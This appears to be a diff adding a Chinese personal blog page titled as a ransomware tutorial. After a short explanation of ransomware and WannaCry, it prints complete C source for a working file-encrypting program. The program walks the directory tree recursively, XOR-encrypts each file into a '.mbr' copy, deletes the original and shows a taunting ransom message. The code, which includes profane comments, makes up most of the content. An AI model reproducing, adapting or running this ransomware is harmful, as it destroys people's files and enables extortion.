@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>成宝博文-勒索病毒教程(附源代码)</title>
+    <!--引入基础库-->
+    <meta name='viewport' content='width=device-width,minimum-scale=1.0 maximum-scale=1.0 user-scalable=no' /> 
+ <!-- bootstrap基础文件 -->
+<link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+   <!-- 结束 -->
+   <!-- 图片懒加载库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+  <script src="js/publicjs.js"></script><!-- 公共js代码 -->
+  <link href="css/publiccss.css" rel="stylesheet"><!-- 公共css代码 -->
+  <!-- 代码高亮库 -->
+  <link href="https://cdn.bootcss.com/prism/1.15.0/themes/prism.css" rel="stylesheet">
+  <link href="https://cdn.bootcss.com/prism/1.15.0/plugins/line-numbers/prism-line-numbers.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/prism/1.15.0/prism.js"></script>
+  <script src="https://cdn.bootcss.com/prism/1.15.0/components/prism-c.js"></script>
+  <script src="https://cdn.bootcss.com/prism/1.15.0/plugins/line-numbers/prism-line-numbers.js"></script>
+  <!-- <link href="https://cdn.bootcss.com/prism/1.15.0/themes/prism-okaidia.css" rel="stylesheet"> -->
+
+  <!-- 妹子框架 -->
+   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/amazeui/2.7.2/css/amazeui.min.css"></script>  -->
+  <!-- 结束 -->
+  <style>
+    	/*在超小屏幕下 手机 小于768px布局容器的宽度为100%*/
+	@media screen and (max-width: 767px){
+	        /*.img{width:100%;}*/
+	    }
+    /*小屏幕 平板电脑 大于等于768px 布局容器改为750px*/
+    	@media screen and (min-width: 768px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+   /*中等屏幕 992px 布局容器改为970px*/
+       	@media screen and (min-width: 992px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+       /*大屏幕 大于1200px 布局容器改为1170px*/
+	    @media screen and (min-width: 992px){
+	     .lazy{height:500px;height:500px}   .
+	  }
+	  p{font-size:20px;}
+	  /*边框图片1*/
+.pho1{
+    border-style: solid;
+    -webkit-border-image: url(http://mmbiz.qpic.cn/mmbiz_png/ianq03UUWGmI9C08F0xksria2z1ypzN4bDqkovVCN9Dq5vEycgYRwzxGhB7fZib9jJrVTDSLiaRQTCjacC0ScsicfrA/0?wx_fmt=png) 35 25 fill;
+    color: rgb(51, 51, 51);
+    border-width: 20px 10px;
+    padding: 5px 20px;
+    font-size: 14px;
+    box-sizing: border-box;
+}
+  </style>
+ </head>
+ <body>
+        <!-- 顶部移动端PC端适配菜单栏 -->
+<nav class="navbar navbar-default" role="navigation">
+    <div class="container-fluid"> 
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target="#example-navbar-collapse">
+            <span class="sr-only">切换导航</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">成宝个人网站</a>
+    </div>
+    <div class="collapse navbar-collapse" id="example-navbar-collapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="#">首页</a></li>
+        </ul>
+    </div>
+    </div>
+</nav>
+ <!-- 菜单结束 -->
+ <!-- 选择主题 -->
+<div class="style-btn">
+<h4>选择主题</h4>
+<button type="button" class="btn btn-default de-style" onclick="green()">护眼绿</button>
+<button type="button" class="btn btn-default dark-style" onclick="dark()">暗黑模式</button>
+</div>
+<!-- 结束 -->
+<!-- 面包屑导航 -->
+<ul class="breadcrumb">
+    <li><a href="#">首页</a></li>
+    <li><a href="#">恶意软件分析</a></li>
+    <li class="active">什么是勒索病毒</li>
+</ul>
+<!-- 面包屑提示结束 -->
+<!-- 正文 -->
+     <div class="container">
+	              <h1>带你认识勒索病毒</h1>
+								</pre>
+				  <!-- <img class="lazy" data-original="https://img.52z.com/upload/news/image/20200421/20200421121630_33367.jpg">  -->
+				  <!-- 必须要这样的格式不知道为什么 不这样行号显示格式会奇奇怪怪的 -->
+				  <h3 style="text-indent: 20px;">勒索病毒是一种加密用户的文件然后勒索交付指定赎金的恶行病毒,勒索病毒也是近几年来互联网安全的头号杀手,在2017年爆发的<span style="color:red">Wannacry(也叫想哭病毒)</span>是利用微软Windows的永恒之蓝漏洞进行大规模传播的勒索病毒之后勒索病毒已经成为了互联网安全整治的一大对象<h3>
+				<p style="text-indent: 20px;">从2017到2020年勒索病毒的传播地步还没有停止还是一个个的在不断变种,很多传统的木马已经开始转向勒索病毒</p>
+				<h2>勒索病毒原理和实现思路?</h2>
+				<p>其实勒索病毒原理并不难</p>
+				<p>1.遍历系统所有的文件如果是文件就执行加密操作如果是文件夹就进入文件夹再次搜索直到把所有文件加密完成为止
+				上代码文件代码(需要你了解Windows系统编程和Windows API函数)不了解也没关系看看瞧瞧也挺不错</p>
+				<p><span style="color:red">GetCurrentDirectory</span>&nbsp;获取当前程序所在的目录(路径)</p>
+				<p><span style="color:red">DeleteFile</span>&nbsp;删除文件</p>
+				<p><span style="color:red">FindFirstFile</span>&nbsp;寻找第一个文件</p>
+				<p><span style="color:red">FindNextFile</span>&nbsp;寻找下一个文件</p>
+
+				    <pre class = "line-numbers"><code class="language-c">
+#include &ltstdio.h&gt
+#include&ltWindows.h&gt
+//勒索病毒源代码
+//what the fuck you big dicks
+//fucing you 
+//get out
+void scrambler(const char *in, const char *out, unsigned char key)
+{
+    FILE *i, *o;
+    int c;
+     
+    i = fopen(in, "rb");
+    o = fopen(out, "wb");//打开文件，因为假定可读写，所以对是否成功不做判断
+    while((c = fgetc(i))!=EOF)//读入字符直到文件结尾
+    {
+        c^=key;//执行异或加密或解密
+        fputc(c,o);//写入文件
+    }
+     
+    fclose(i);
+    fclose(o);
+}
+//搜索文件和文件夹
+void FindFile(char* fileName){
+	  char  PathName[MAX_PATH];
+	  memset(PathName,0,MAX_PATH);
+	  sprintf(PathName,"%s\\*.*",fileName);
+	 //  printf("%s\n",PathName);
+	  //开始搜索
+	  WIN32_FIND_DATA findData;
+	  HANDLE hFile = FindFirstFile(PathName,&findData);
+	  char Temp[MAX_PATH];
+	  if (hFile == INVALID_HANDLE_VALUE){
+	    printf("失败\n");
+	  }
+	  //找到
+  do{
+	  if(findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){
+		 
+		  if(findData.cFileName[0] != '.'){
+			 
+		      //继续探测
+			
+			 memset(Temp,0,MAX_PATH);
+			  //拼接
+			  sprintf(Temp,"%s\\%s",fileName,findData.cFileName);
+			 printf("%s\n",Temp);
+			  FindFile(Temp);//递归寻找
+		}
+		 
+	  }else{
+	        memset(Temp,0,MAX_PATH);
+			char path[1024];//新的路径
+			 //拼接
+			 sprintf(Temp,"%s\\%s",fileName,findData.cFileName);
+			 printf("%s\n",Temp);
+			 sprintf(path,"%s.mbr",Temp);//拼接路径 后缀名加.mbr
+	        scrambler(Temp,path,0x89);
+	       DeleteFile(Temp);
+	  }
+  }while(FindNextFile(hFile,&findData));
+
+}
+
+int main(){
+	char mypath[MAX_PATH];
+	//当前程序所在的路径
+	GetCurrentDirectory(MAX_PATH,mypath);
+	 FindFile(mypath);
+	 printf("你的文件已被加密!\n");
+	 printf("后缀名为.mbr我敢保证没有我的解密服务你是解不开的也你的文件都废了叫爸爸帮你解密\n");
+system("pause");
+return 1;
+}
+							</code>
+					</pre>
+	</div>
+
+ <div class="pho1">
+  <!-- 粗体字体 -->
+  <span style="font-weight: bold;">注意:数据无价 重要数据请注意备份</span>
+  </div>
+   <!-- 正文结束 -->
+	 <!-- ----------------底部面板------------------------ -->
+ <div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">温馨提示</h3>
+    </div>
+    <div class="panel-body">
+         <p>欢迎收藏哦</p>
+		<strong>如有问题请联系作者微信:<span style="color:red;">HA2765441358</span></strong>
+    </div>
+</div>
+<!-------------- 面板结束--------------------------- -->
+ </body>
+ <script>
+	
+ </script>
+</html>
